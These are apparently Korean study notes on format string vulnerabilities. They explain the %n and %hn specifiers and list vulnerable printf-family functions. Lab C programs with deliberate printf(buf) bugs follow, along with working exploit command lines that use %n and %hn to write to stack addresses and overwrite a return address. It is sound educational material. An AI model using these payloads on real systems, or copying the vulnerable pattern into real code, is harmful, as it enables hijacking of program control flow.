# 1. 주요 포맷 스트링 문자

| Parameter | Format                                |
| --------- | ------------------------------------- |
| %d        | decimal integer                       |
| %f        | float                                 |
| %lf       | double                                |
| %c        | character                             |
| %u        | unsigned decimal integer              |
| %o        | unsigned octal integer                |
| %x        | unsigned hexadecimal integer          |
| %s        | null-terminated string                |
| %n        | int *(number of bytes so far)         |
| %hn       | half of %n, **2 bytes** unit (더 정교함!) |
- `%n` vs `%hn`
	- 두 지정자 모두 현재까지 **출력된 바이트 수**를 인자가 가리키는 메모리 주소에 쓰는 기능
# 2. 포맷 스트링 공격
- 취약 함수에 **포맷 문자열 인자 하나만 전달**될 때, 해당 문자열 내 포맷 지정자는 **스택 최상단부터 맵핑**됨 
- %hn, %n과 같이 **인자에 쓰기 작업**을 할 수 있는 포맷 지정자를 이용하여 ret 주소를 변조해 임의의 동작을 수행하는 공격
# 3. 포맷 스트링에 취약한 함수
- `printf`
- `fprintf`
- `sprintf`
- `snprintf`
# 4. 실습
## 4.1 `test2.c`
```c
#include <stdio.h>

main() {
	char *buffer = "wishfree\n%x\n";
	printf(buffer); 
}
```
![[Pasted image 20251209155958.png|400]]
- 0x08048440는 문자열의 주소!
## 4.2 `test4.c`
```c
#include <stdio.h>

main() {
	int d = 1234, i = 0;
	printf("Address of i: %x\n", &i);
	printf("Value of i: %x\n", i);
	
	printf("%d%n\n", d, &i); // %n 앞에서 1234가 출력됨. 따라서 &i에 4를 저장.
	printf("Changed value of i: %x\n", i); 
}
```
## 4.3 `test6.c`
```c
#include <stdio.h>
#include "dumpcode.h" // 해당 코드 구현은 크게 중요하진 않음

main() {
	char buffer[64];
	fgets(buffer, 63, stdin);
	printf(buffer);
	dumpcode((char *)buffer, 96);
} 
```
- `(printf "\x41\x41\x41\x41\x78\xfb\xff\xbf%%c%%n"; cat) | ./test6`
- ![[Pasted image 20251209160234.png|400]]
- `%n`에 대응되는 곳에 (00 00 00 09)가 저장됨. 
## 4.4 `format_bugfile.c`
```c
#include <stdio.h>

main() {
	int i = 0;
	char buf[64];
	memset(buf, 0, 64);
	read(0, buf, 64);
	printf(buf);
}
```
- `AAAAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x`
- %x에서 0이 출력되는 곳이 바로 `int i = 0;`이다. 따라서 0이 출력되는 곳의 위는 ebp, ret 임을 알 수 있음.
- ![[Pasted image 20251209160455.png|400]]
- `(printf "\x41\x41\x41\x41\x2c\xf1\xff\xbf\x41\x41\x41\x41\x2e\xf1\xff\xbf%%64280d%%hn%%50391d%%hn";cat) | ./format_bugfile` 
- ![[Pasted image 20251209160723.png|400]]